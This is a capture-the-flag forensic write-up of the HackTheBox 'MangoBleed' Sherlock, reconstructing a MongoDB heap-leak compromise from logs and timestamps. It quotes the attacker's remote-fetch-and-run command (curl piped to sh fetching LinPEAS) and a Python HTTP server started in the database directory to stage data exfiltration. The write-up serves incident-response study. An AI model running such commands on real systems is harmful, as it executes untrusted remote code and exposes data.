---
title: "HackTheBox — MangoBleed (Sherlock / Very Easy)"
date: 2025-12-31 10:00:00 +0530
categories: [CTF, HackTheBox]
tags: [sherlock, dfir, forensic, mongobleed, cve-2025-14847, memory-disclosure, ssh, linpeas]
author: Prince_kumar
math: false
mermaid: false
---

> **An incident response investigation into CVE-2025-14847 (MongoBleed) — tracing the exploitation of a MongoDB heap leak, credential theft, SSH intrusion, and data staging.**  
> This is a detailed forensic analysis report of the MongoBleed incident on the `mongodbsync` server.

---

## 1. Executive Summary

A high‑priority incident was reported involving a suspected compromise of the server `mongodbsync`, a secondary MongoDB server. The server was believed to be vulnerable to **MongoBleed**, a heap memory disclosure vulnerability in MongoDB’s zlib compression handling.

A triage acquisition (UAC) was provided for analysis. The investigation confirmed that the server was successfully exploited via **CVE‑2025‑14847** (MongoBleed), leading to the exposure of in‑memory secrets. The attacker subsequently used stolen credentials to gain interactive SSH access, performed privilege escalation reconnaissance, and prepared to exfiltrate sensitive MongoDB data.

All attacker activity was traced to a single remote IP address: **65.0.76.43**. The incident started with exploitation at **2025-12-29 05:25:52 UTC** and concluded with the closing of the attacker’s SSH session at approximately **05:48:11 UTC**.

**Key findings:**
- 75,260 malicious connections exploiting CVE‑2025‑14847.
- Credential theft of the `mongoadmin` account.
- Interactive SSH login at **05:40:03 UTC**.
- Execution of LinPEAS in‑memory for privilege escalation.
- A Python HTTP server started in the MongoDB data directory (`/var/lib/mongodb`), indicating data exfiltration preparation.

Immediate remediation and further investigation are required.

---

## 2. Incident Overview

- **Hostname:** `mongodbsync`
- **Role:** Secondary MongoDB server
- **Vulnerability Exploited:** CVE‑2025‑14847 (MongoBleed) – Heap memory disclosure in MongoDB Server’s zlib compression logic.
- **Impact:** Unauthenticated remote attacker can read uninitialized heap memory, potentially exposing authentication credentials, configuration data, or other sensitive in‑memory information.
- **Artifacts Provided:** Triage image collected via UAC.

All analysis was performed on a forensic workstation using native Linux tools and the publicly available **mongobleed‑detector** script.

---

## 3. Analysis Methodology

1. **Extraction:** UAC triage image extracted, placing all root files under `[root]`.
2. **Log Analysis:**
   - MongoDB logs (`/var/log/mongodb/mongod.log`) examined for version information and exploit patterns.
   - Authentication logs (`/var/log/auth.log`) reviewed for brute‑force and successful SSH sessions.
   - User bash history (`/home/mongoadmin/.bash_history`) inspected for post‑exploitation commands.
3. **Tool Assistance:** The `mongobleed-detector.py` script was used to parse MongoDB logs, identify exploitation indicators, and summarise connection statistics.
4. **Correlation:** Timestamps, IP addresses, and event IDs were correlated to reconstruct the attacker’s timeline.

---

## 4. Detailed Findings

### 4.1. CVE Identification
**Question 1:** *What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?*

**Finding:** The scenario explicitly names the vulnerability **MongoBleed** and describes it as a heap‑memory disclosure in the zlib compression handler. Public advisory confirms it as **CVE‑2025‑14847**.

**Answer:** `CVE-2025-14847`

---

### 4.2. MongoDB Version
**Question 2:** *What is the version of MongoDB installed on the server that the CVE exploited?*

**Analysis:**  
The MongoDB log file was searched for the `Buildinfo` keyword, which appears during server startup.

**Command:**  
```bash
grep -i 'buildinfo' /var/log/mongodb/mongod.log
```

**Relevant Log Snippet:**
```json
{"t":{"$date":"..."},"s":"I","c":"CONTROL","id":...,"msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16", ...}}}
```

**Answer:** `8.0.16` – This version is confirmed vulnerable to CVE‑2025‑14847.

---

### 4.3. Attacker’s Remote IP Address
**Question 3:** *Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.*

**Analysis:**  
The MongoBleed exploit involves sending thousands of specially crafted compressed messages in a short time. Each message typically results in a connection accepted (event ID 22943) followed by an immediate disconnect (event ID 22944). The **mongobleed‑detector** script automatically aggregates such patterns.

**Execution:**  
```bash
python3 mongobleed-detector.py /var/log/mongodb/mongod.log
```

**Output Summary:**
```
Remote IP: 65.0.76.43
Connections: 75260
Metadata rate: low
Confidence: HIGH
```

A low metadata rate is a strong indicator of successful exploitation. Manual verification with `grep` confirms that this IP dominates the connection events.

**Answer:** `65.0.76.43`

---

### 4.4. Start of Exploitation Activity
**Question 4:** *Determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event).*

**Analysis:**  
Using the detector script output or by examining the first log entry from the attacker’s IP:

```bash
grep '65.0.76.43' /var/log/mongodb/mongod.log | head -1
```

**Resulting Timestamp:**
```
{"t":{"$date":"2025-12-29T05:25:52.000+00:00"}, ... "remote":"65.0.76.43..."}
```

**Answer:** `2025-12-29 05:25:52` (UTC)

---

### 4.5. Number of Malicious Connections
**Question 5:** *Calculate the total number of malicious connections initiated by the attacker.*

**Analysis:**  
The detector script reported **75,260** connections. Manual counting was performed by filtering for connection‑accepted events (ID 22943) from the malicious IP:

```bash
grep '65.0.76.43' /var/log/mongodb/mongod.log | grep '"id":22943' | wc -l
```

Output: **75260**

**Answer:** `75260`

---

### 4.6. Interactive Remote Access
**Question 6:** *When did the attacker successfully gain interactive hands‑on remote access?*

**Analysis:**  
The attacker likely recovered credentials from the heap memory leak and used them to SSH into the server. The `/var/log/auth.log` file was filtered for the attacker’s IP:

```bash
grep '65.0.76.43' /var/log/auth.log
```

**Key Observations:**
- Multiple failed password attempts for user `mongoadmin`.
- A successful login that immediately disconnected (automated brute‑force tool):
  ```
  Dec 29 05:39:59 mongodbsync sshd[39825]: Accepted password for mongoadmin from 65.0.76.43 port ...
  Dec 29 05:39:59 mongodbsync sshd[39825]: pam_unix(sshd:session): session opened for user mongoadmin
  Dec 29 05:39:59 mongodbsync sshd[39825]: pam_unix(sshd:session): session closed for user mongoadmin
  ```
- A second successful login (SSH process ID 39901) that remained active for approximately 8 minutes:
  ```
  Dec 29 05:40:03 mongodbsync sshd[39901]: Accepted password for mongoadmin from 65.0.76.43 port ...
  Dec 29 05:40:03 mongodbsync sshd[39901]: pam_unix(sshd:session): session opened for user mongoadmin
  ...
  Dec 29 05:48:11 mongodbsync sshd[39901]: pam_unix(sshd:session): session closed for user mongoadmin
  ```

The second session represents genuine interactive access. Therefore, the attacker gained hands‑on control at **05:40:03**.

**Answer:** `2025-12-29 05:40:03`

---

### 4.7. In‑Memory Privilege Escalation Script
**Question 7:** *Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege escalation attempt.*

**Analysis:**  
The bash history of the compromised `mongoadmin` account was inspected:

```bash
cat /home/mongoadmin/.bash_history
```

**Relevant Command:**
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

This command downloads the latest LinPEAS (Linux Privilege Escalation Awesome Script) directly into memory via `curl` and pipes it to `sh`, leaving no permanent file on disk.

**Answer:** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

---

### 4.8. Target Directory for Data Exfiltration
**Question 8:** *Which directory was the target for data exfiltration?*

**Analysis:**  
Further examination of the bash history revealed the attacker’s navigation and preparation actions:

```bash
cd /var/lib/mongodb
ls -la
python3 -m http.server 8080
```

The attacker moved into the MongoDB data directory and started a Python HTTP server on port 8080. This strongly suggests they intended to download the contents of `/var/lib/mongodb` (database files, etc.) from a remote location.

**Answer:** `/var/lib/mongodb`

---

## 5. Incident Timeline (UTC)

| **Timestamp**           | **Event**                                                                 |
|-------------------------|---------------------------------------------------------------------------|
| 2025-12-29 05:25:52     | First malicious connection exploiting CVE‑2025‑14847 from 65.0.76.43      |
| 2025-12-29 05:27:12     | Approximate end of mass exploitation (75,260 connections in ~2 minutes)   |
| 2025-12-29 05:39:59     | Automated SSH login success (credential validation) and immediate logout  |
| 2025-12-29 05:40:03     | Attacker gains interactive SSH access as `mongoadmin`                     |
| 2025-12-29 05:40:03–05:48:11 | Hands‑on session: LinPEAS execution, navigation to `/var/lib/mongodb`, Python HTTP server started |
| 2025-12-29 05:48:11     | SSH session closed (attacker disconnects)                                 |

---

## The Fundamentals Behind the Challenge

Analyzing the attacker's progression from initial vulnerability exploit to credential retrieval and exfiltration techniques provides deep insight into modern attack pathways.

### 1. CVE-2025-14847 (MongoBleed) Heap Memory Disclosure
MongoBleed is a heap memory leakage vulnerability affecting MongoDB. The bug lies within the way the server handles zlib compression for incoming client connections. 

Specifically, when a client specifies zlib compression and submits a malformed message, the decompression subroutine fails to properly validate the buffer boundaries or verify the decompressed size against the actual bytes written. Consequently, the MongoDB server responds by returning uninitialized heap memory. 

Since MongoDB processes authentication requests, user sessions, and database queries on the heap, sensitive variables (such as plaintext passwords for database and system administrators) reside in this memory area. By sending a massive loop of requests (75,260 queries), the attacker extracted contiguous chunks of the heap, eventually scraping the cleartext password for the `mongoadmin` user.

### 2. In-Memory Execution of Shell Scripts (`curl | sh`)
Traditional intrusion detection systems (IDS) and Endpoint Detection & Response (EDR) solutions monitor the creation and modification of files on disk. To bypass these checks, attackers rely on running scripts directly in memory. 

By running:
```bash
curl -L https://github.com/carlospolop/PEASS-ng/.../linpeas.sh | sh
```
The attacker issues a `curl` request to fetch the script payload from GitHub, and instead of saving the output to a file (like `/tmp/linpeas.sh`), redirects it directly to the standard input of the shell interpreter (`sh`). The shell parses and executes the script line by line in-memory, ensuring no malicious signature is left on the filesystem, minimizing the forensic footprint.

### 3. Rapid Data Exfiltration using Python Built-in Web Server
Once interactive access is achieved, attackers need a rapid, lightweight method to exfiltrate database contents. Since compiling or installing custom exfiltration tools could trigger alerts or raise suspicion, attackers leverage standard tools already available on the target operating system.

Python's `http.server` module is pre-installed on almost all modern Linux distributions. By running:
```bash
python3 -m http.server 8080
```
the attacker instantly mounts a web server rooted at the current directory (`/var/lib/mongodb`). Any file within that directory can then be grabbed via simple HTTP GET requests from a remote attacker-controlled machine, allowing effortless data exfiltration without introducing new utilities to the system.

---

## Vulnerability Summary

| Stage | Vulnerability / Technique | Impact |
|-------|---------------------------|--------|
| **Foothold** | CVE‑2025‑14847 (MongoBleed) Heap Memory Disclosure | Leakage of uninitialized memory containing credentials. |
| **Pivot** | Credential reuse via SSH | Gain interactive terminal shell as `mongoadmin`. |
| **Reconnaissance** | In-memory LinPEAS script execution | Discovery of local privilege escalation vectors. |
| **Exfiltration** | Python HTTP server staging | Staging database files in `/var/lib/mongodb` for HTTP download. |

---

## Key Takeaways

1. **Heap leaks are critical:** Memory disclosure bugs like MongoBleed or Heartbleed are highly dangerous as they bypass authentication altogether to reveal raw configuration files and active user passwords in memory.
2. **Monitor bash execution streams:** Log command-line history and monitor for pipe redirections like `curl ... | sh` to capture in-memory script executions.
3. **Restrict outgoing ports & processes:** Lock down unnecessary outbound connections and alert on unauthorized local HTTP servers running on internal databases.
